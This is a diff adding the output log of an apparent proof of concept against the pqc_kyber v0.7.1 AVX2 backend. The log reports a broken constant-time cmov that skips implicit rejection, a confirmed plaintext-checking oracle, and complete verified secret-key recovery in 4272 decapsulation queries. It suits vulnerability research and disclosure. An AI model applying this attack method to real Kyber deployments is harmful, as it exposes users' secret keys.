@@ -1,0 +1,42 @@
+================================================================
+ pqc_kyber v0.7.1  AVX2 cmov FO-bypass PoC
+ backend compiled: avx2
+ params: KYBER_K=3 N=256 Q=3329 CT=1088 SK=2400 PK=1184
+================================================================
+
+[L1.1] cmov(len=32, b=1) primitive probe:
+       backend=avx2      copied_all_32_bytes=false  => cmov BROKEN (implicit rejection SKIPPED)  <-- BUG
+       r[0..8] = 0000000000000000
+
+[L1.2] valid round-trip (a correct cmov is a no-op on success):
+       ss_enc         = 6467ce2c277369300e27b8d1844daaa864902c386e45818151efc4e5d5024ead
+       ss_dec(valid)  = 6467ce2c277369300e27b8d1844daaa864902c386e45818151efc4e5d5024ead
+       round-trip OK  = true
+
+[L1.3] decapsulate(corrupted ct'):
+       backend=avx2
+       ss(ct') = 607edb06511ae5d550c9bb728a9dd76e41990551f6e730a8c03d094879af2139
+       (saved to out_ss_avx2.txt for cross-build diff)
+
+[L1.4] plaintext-checking oracle demonstration (avx2):
+       h(pk)=SHA3-256(pk)      = 9a8387877d16abb2408618fb412e0d854b8c130dc0ae592ad220ee34b93fb331
+       true m'=indcpa_dec(ct') = a695d9e13aad01d240ac28b4903f7b62374639a5782a548d215605043cff3fdd
+       oracle ss(ct')          = 607edb06511ae5d550c9bb728a9dd76e41990551f6e730a8c03d094879af2139
+       recomputed ss for m'    = 607edb06511ae5d550c9bb728a9dd76e41990551f6e730a8c03d094879af2139
+       recomputed ss for m''   = 2625ef93b53bf4edd8e09a649d7b4be2c89fd7091e4a7b99be8aa1723ee7516b
+       ss(m') == oracle : true   ss(m'') == oracle : false
+       => oracle output is a deterministic, attacker-computable function of m'.
+       => PLAINTEXT-CHECKING ORACLE confirmed.
+
+[L2] key recovery via PC oracle (C=400):
+     oracle queries (decapsulate calls) : 4272
+     oracle-bit == plaintext-bit agree   : 4272
+     anomalies (unexpected message)      : 0
+     unresolved coefficients             : 0
+     recovered vs ground-truth mismatches: 0  (over 768 coeffs)
+     wall-clock                          : 170.013ms
+     s_rec[0][0..16]   = [0,0,1,-1,0,2,1,1,0,1,0,0,1,1,1,1]
+     s_truth[0][0..16] = [0,0,1,-1,0,2,1,1,0,1,0,0,1,1,1,1]
+     functional check: recovered-s reproduces indcpa_dec on 64/64 random ciphertexts
+
+[L2 RESULT] key recovery: COMPLETE and VERIFIED against ground-truth sk
